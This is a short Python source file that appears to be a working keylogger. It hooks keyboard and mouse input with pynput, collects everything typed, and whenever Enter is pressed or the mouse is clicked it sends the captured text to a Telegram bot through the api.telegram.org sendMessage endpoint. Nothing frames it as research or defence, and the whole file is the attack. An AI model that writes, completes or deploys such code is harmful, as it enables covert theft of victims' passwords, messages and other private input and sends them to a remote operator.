from pynput.keyboard import Key, Listener
from pynput import mouse
import requests
import telebot

fullog = ''
words = ''

botToken = ''
chatId = ''
bot = telebot.TeleBot(botToken)

def onPress(key):
    global fullog
    global words

    if key == Key.space:
        words += ' '

    elif key == Key.enter:
        fullog += words + '\n'
        send(fullog)
        words = ''
        fullog = ''
        
    #elif key == Key.ctrl_l or key == Key.ctrl_r or key == Key.tab or key == Key.caps_lock or key == Key.shift_l or key == Key.shift_r:
        #pass

    elif key == Key.backspace:
        words = words[:-1]
    else:
        char = f'{key}'
        char = char.replace("'", "")
        words += char
    
    if key == Key.esc:
        return False
    
def click(x, y, button, pressed):
    global fullog
    global words

    if len(words) > 0 and pressed:
        fullog += words + '\n'
        send(fullog)
        words = ''    
        fullog = ''
    else:
        pass

#@bot.message_handler(commands=["send"])
def send(message):
    url = f'https://api.telegram.org/bot{botToken}/sendMessage'
    payload = {
        'chat_id': chatId,
        'text': message
    }
    response = requests.post(url, data=payload)
    return response.json()

def main():
    with Listener(on_press=onPress) as k_listener, mouse.Listener(on_click=click) as m_listener:
        k_listener.join()
        m_listener.join()

if __name__ == "__main__":
    main()
